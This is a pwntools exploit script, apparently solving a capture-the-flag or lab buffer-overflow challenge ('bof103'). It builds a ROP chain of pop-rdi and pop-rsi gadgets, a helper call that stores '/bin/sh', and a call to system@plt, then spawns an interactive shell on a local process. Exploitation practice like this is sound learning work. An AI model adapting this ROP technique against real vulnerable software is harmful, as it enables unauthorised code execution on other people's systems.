#ideas

## use use_me function to store the /bin/sh string using calling convention
## find the system PLT address to call the system function
## find the key variable address (which stores /bin/sh) and call it before calling system

## calling system needs RDI again, bcs system(param1) === RAX(RDI) 

from pwn import *

binary = "./bof103"
elf = context.binary = ELF(binary)
p = process(binary)


#gadgets
# 0x0000000000400723 : pop rdi ; ret
# 0x00000000004006b8 : pop rsi ; ret


rdi = p64(0x0000000000400723)
rsi = p64(0x00000000004006b8)
ret = p64(0x00000000004004b1)
system = p64(0x40069e) # call system PLT -> objdump -d bof103 | grep "system" -> 40069e:       e8 3d fe ff ff          call   4004e0 <system@plt>
use_me = p64(0x00400626)
key = p64(0x00601058) 

bin_sh = b"/bin/sh\x00"

payload = b"A"*24
payload += ret
payload += rdi
payload += bin_sh
payload += rsi
payload += p64(1)
payload += use_me
payload += rdi
payload += key
#payload += ret
payload += system


p.recv()
#pause()
p.sendline(payload)

p.interactive()

